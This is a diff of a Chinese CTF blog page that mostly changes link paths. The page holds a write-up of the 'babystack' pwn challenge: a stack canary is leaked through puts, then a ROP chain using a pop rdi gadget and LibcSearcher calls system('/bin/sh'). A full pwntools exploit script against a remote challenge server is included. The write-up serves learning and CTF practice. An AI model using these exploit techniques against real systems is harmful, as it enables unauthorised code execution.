@@ -5,47 +5,47 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="本题，用checksec检查二进制，发现开启了CANARY、NX、以及RELRO保护，CANARY是用来检测栈溢出的，canary是一个随机数，存储在栈里。程序通过对比栈里的canary值和读取到的实际canary值进行对比，如果不相等，则抛出异常。因此，为了绕过canary机制，我们需要先想泄露canary的值，然后利用栈溢出，把这个值放到payload中对应的位置里，这样，程序发现canary">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnh8_babystack">
-<meta property="og:url" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/index.html">
+<meta property="og:url" content="https://github.com/2019/10/30/pwnh8-babystack/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="本题，用checksec检查二进制，发现开启了CANARY、NX、以及RELRO保护，CANARY是用来检测栈溢出的，canary是一个随机数，存储在栈里。程序通过对比栈里的canary值和读取到的实际canary值进行对比，如果不相等，则抛出异常。因此，为了绕过canary机制，我们需要先想泄露canary的值，然后利用栈溢出，把这个值放到payload中对应的位置里，这样，程序发现canary">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/5.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/6.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/7.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/8.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/9.png">
-<meta property="og:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/10.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/1.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/2.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/3.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/4.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/5.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/6.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/7.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/8.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/9.png">
+<meta property="og:image" content="https://github.com/2019/10/30/pwnh8-babystack/10.png">
 <meta property="article:published_time" content="2019-10-30T01:34:00.000Z">
 <meta property="article:modified_time" content="2025-06-21T04:06:04.882Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="栈溢出">
 <meta property="article:tag" content="ROP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/1.png">
+<meta name="twitter:image" content="https://github.com/2019/10/30/pwnh8-babystack/1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/">
+<link rel="canonical" href="https://github.com/2019/10/30/pwnh8-babystack/">
 
 
 <script id="page-configurations">
@@ -107,7 +107,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -128,27 +128,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -206,10 +206,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/10/30/pwnh8-babystack/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2019/10/30/pwnh8-babystack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -244,7 +244,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -267,32 +267,32 @@
 
       
         <p>本题，用checksec检查二进制，发现开启了CANARY、NX、以及RELRO保护，CANARY是用来检测栈溢出的，canary是一个随机数，存储在栈里。程序通过对比栈里的canary值和读取到的实际canary值进行对比，如果不相等，则抛出异常。因此，<strong>为了绕过canary机制，我们需要先想泄露canary的值，然后利用栈溢出，把这个值放到payload中对应的位置里，这样，程序发现canary的值没变，我们就成功绕过。</strong></p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/1.png" class="" title="1.png">
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/2.png" class="" title="2.png">
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/3.png" class="" title="3.png">
+<img src="/2019/10/30/pwnh8-babystack/1.png" class="" title="1.png">
+<img src="/2019/10/30/pwnh8-babystack/2.png" class="" title="2.png">
+<img src="/2019/10/30/pwnh8-babystack/3.png" class="" title="3.png">
 
 <p>为了泄露canary的值，我们的利用一下puts函数的特性,puts函数会一直输出某地址的数据直到遇到\x00</p>
 <p>通过IDA,我们发现这里CANARY存于栈底上面一个位置</p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/4.png" class="" title="4.png">
+<img src="/2019/10/30/pwnh8-babystack/4.png" class="" title="4.png">
 <p>然后我们查看buf的位置，距离栈底0x90，那么buf距离canary的位置为0x88,。</p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/5.png" class="" title="5.png">
+<img src="/2019/10/30/pwnh8-babystack/5.png" class="" title="5.png">
 <p>于是，我们先构造这样的payload，因为canary值开始的地方可能会有0数据，所以，我们使用循环，将0覆盖为a,一次次的尝试，<strong>当puts输出的数据长度大于我们发送的数据长度时，说明canary的值已经被泄露成功，我们要立即结束循环，并且记下当前覆盖了canary的多少个0数据，然后，我们在前面填充这么多个\x00数据，最后截取前8字节数据，就得到了canary代表的字符串(是乱码)</strong></p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/6.png" class="" title="6.png">
+<img src="/2019/10/30/pwnh8-babystack/6.png" class="" title="6.png">
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0x88过后0x89开始便是canary，但由于0x89可能是0,为了利用put泄露canary，我们就先将这里覆盖为aa  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)  </span><br><span class="line">  </span><br><span class="line">c = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#覆盖canary的前导0  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):  </span><br><span class="line">   sh.send(payload+<span class="string">&#x27;a&#x27;</span>*i)  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">   sh.sendline(<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.recv(<span class="number">0x88</span>+i)  </span><br><span class="line">   c = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line"><span class="comment">#   print c  </span></span><br><span class="line">   l = <span class="built_in">len</span>(c)  </span><br><span class="line">   <span class="keyword">if</span> l &gt; <span class="number">4</span>: <span class="comment">#长度大于我们发送的字符串长度，说明数据已经暴露出来了  </span></span><br><span class="line">      <span class="keyword">break</span>;  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">   sh.sendline(<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line"><span class="comment">#print c  </span></span><br><span class="line"><span class="comment">#补齐8字节  </span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i):  </span><br><span class="line">   c = <span class="string">&#x27;\x00&#x27;</span> + c  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#取前8字节数据，这才是canary  </span></span><br><span class="line">c = c[<span class="number">0</span>:<span class="number">8</span>]  </span><br></pre></td></tr></table></figure>
 
 <p>得到了canary，我们就可以进行栈溢出ROP操作了<br><strong>还有一点就是，本题给的libc是假的，和服务器上的不一致，因此我们使用libcSearcher，而不使用这个库。</strong></p>
 <p><strong>X64传参的方式<br>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</strong></p>
 <p>因此，为了将数据放入rdi寄存器，我们需要找到一条pop rdi的指令，我们不能把指令写在栈里，因为开启了栈不可执行保护。我们发现了，在IDA中搜索pop，我们发现了这里可以被我们利用</p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/7.png" class="" title="7.png">
+<img src="/2019/10/30/pwnh8-babystack/7.png" class="" title="7.png">
 
 <p>我们选择pop r15，选择undefine</p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/8.png" class="" title="8.png">
+<img src="/2019/10/30/pwnh8-babystack/8.png" class="" title="8.png">
 
 <p>然后选择下面的两字节数据，选择Code</p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/9.png" class="" title="9.png">
+<img src="/2019/10/30/pwnh8-babystack/9.png" class="" title="9.png">
 
 <p>这样，<strong>就出现了pop rdi指令,这是一种巧妙的方法，类似的，我们可以对r14,r13操作，获得其他相关指令，它的地址为0x400A93，并且过后还有一个retn，我们完全可以把这里看成是一个函数的开始</strong></p>
-<img src="/ha1vk/2019/10/30/pwnh8-babystack/10.png" class="" title="10.png">
+<img src="/2019/10/30/pwnh8-babystack/10.png" class="" title="10.png">
 
 <p>我们最终的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="comment">#本题给的libc是假的，所以我们使用LibcSearcher  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]  </span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#sh = process(&#x27;./babystack&#x27;)  </span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">39287</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#0x88过后0x89开始便是canary，但由于0x89可能是0,为了利用put泄露canary，我们就先将这里覆盖为aa  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)  </span><br><span class="line">  </span><br><span class="line">c = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#覆盖canary的前导0  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):  </span><br><span class="line">   sh.send(payload+<span class="string">&#x27;a&#x27;</span>*i)  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">   sh.sendline(<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.recv(<span class="number">0x88</span>+i)  </span><br><span class="line">   c = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line"><span class="comment">#   print c  </span></span><br><span class="line">   l = <span class="built_in">len</span>(c)  </span><br><span class="line">   <span class="keyword">if</span> l &gt; <span class="number">4</span>: <span class="comment">#长度大于我们发送的字符串长度，说明数据已经暴露出来了  </span></span><br><span class="line">      <span class="keyword">break</span>;  </span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">   sh.sendline(<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#print c  </span></span><br><span class="line"><span class="comment">#补齐8字节  </span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i):  </span><br><span class="line">   c = <span class="string">&#x27;\x00&#x27;</span> + c  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#取前8字节数据，这才是canary  </span></span><br><span class="line">c = c[<span class="number">0</span>:<span class="number">8</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#print c  </span></span><br><span class="line">canary = u64(c)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;canary=&#x27;</span>,<span class="built_in">hex</span>(canary)  </span><br><span class="line">mainaddr = <span class="number">0x400908</span>  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#经过验证，我们尽量暴露那些程序中使用的函数,假如我们改成write函数，发现不能getshell  </span></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">put_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="comment">#pop edi指令所在的地址  </span></span><br><span class="line"><span class="comment">#64位函数参数传递方式,当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9  </span></span><br><span class="line">popedi = <span class="number">0x400A93</span>  </span><br><span class="line">  </span><br><span class="line">popesi = <span class="number">0x400a91</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#暴露了canary，接下来，我们就可以利用栈溢出了,函数重新返回到main  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(popedi) + p64(put_got) + p64(put_plt) + p64(mainaddr)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">sh.send(payload)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#泄露puts的加载地址  </span></span><br><span class="line">puts_addr = u64( (sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) )  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#获取libc加载基地址  </span></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line"><span class="comment">#获取system加载地址  </span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment">#获取binsh字符串  </span></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system() addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(popedi) + p64(binsh_addr) + p64(system_addr)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">sh.send(payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#执行getshell  </span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
@@ -304,8 +304,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
-              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
           </div>
 
         
@@ -314,11 +314,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2019/10/27/pwnh5/" rel="prev" title="攻防世界-pwnh5">
+    <a href="/2019/10/27/pwnh5/" rel="prev" title="攻防世界-pwnh5">
       <i class="fa fa-chevron-left"></i> 攻防世界-pwnh5
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2019/10/30/pwnh9/" rel="next" title="pwnh9">
+    <a href="/2019/10/30/pwnh9/" rel="next" title="pwnh9">
       pwnh9 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -390,20 +390,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -476,30 +476,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
